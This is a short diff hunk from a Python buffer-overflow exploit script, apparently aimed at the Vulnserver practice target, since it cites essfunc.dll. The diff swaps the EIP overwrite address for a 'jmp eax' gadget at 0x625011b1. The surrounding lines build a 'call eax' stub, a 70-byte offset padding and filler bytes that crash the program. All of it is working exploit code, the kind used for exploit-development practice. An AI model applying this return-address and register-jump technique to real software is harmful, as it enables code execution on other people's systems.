@@ -75,10 +75,9 @@ setrecv += "\xff\xd0"                  # call eax
 
 # 70 byte offset to EIP
 paddingeip = "\x41" * (70-len(setrecv))     # offset to EIP
+     
 
-eax = "\x0C\x10\x40\x00"       
-
-#eax = "\xb1\x11\x50\x62"			     # 0x625011b1 jmp eax essfunc.dll
+eax = "\xb1\x11\x50\x62"			     # 0x625011b1 jmp eax essfunc.dll
 crash = "\x43" * (2000-len(setrecv+paddingeip+eax))  # remaining bytes to crash
 
 
